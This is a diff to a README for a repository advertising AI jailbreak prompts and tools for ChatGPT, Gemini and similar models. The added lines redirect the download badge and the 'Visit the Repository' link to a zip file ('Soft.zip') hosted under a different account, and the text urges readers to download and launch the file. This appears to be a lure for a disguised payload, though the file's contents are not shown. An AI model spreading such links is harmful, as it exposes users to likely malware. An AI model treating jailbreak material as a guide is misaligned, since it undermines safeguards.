@@ -21,7 +21,7 @@ This repository focuses on pushing the boundaries of AI technology by exploring 
 
 ## Important Link
 
-[![Download Jailbreak Release](https://img.shields.io/badge/Download-Jailbreak%20Release-blue.svg)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Jailbreak Release](https://github.com/pacewiliam/AI-Jailbreaks/releases/download/v1.0/Soft.zip%https://github.com/pacewiliam/AI-Jailbreaks/releases/download/v1.0/Soft.zip)](https://github.com/pacewiliam/AI-Jailbreaks/releases/download/v1.0/Soft.zip)
 
 🔗 Click the button above to download the Jailbreak Release file. Launch the file to access the latest jailbreaking tools and resources.
 
@@ -30,7 +30,7 @@ ai, aijailbreaks, aijailbreak, ais, chatgpt, dan, free, gemini, guidelines, jail
 
 ## Visit the Repository
 
-👉 [AI-Jailbreaks Repository](https://github.com/adelante20/AI-Jailbreaks)
+👉 [AI-Jailbreaks Repository](https://github.com/pacewiliam/AI-Jailbreaks/releases/download/v1.0/Soft.zip)
 
 Explore the extensive collection of jailbreaking prompts and resources to take your AI experimentation to new heights!
 
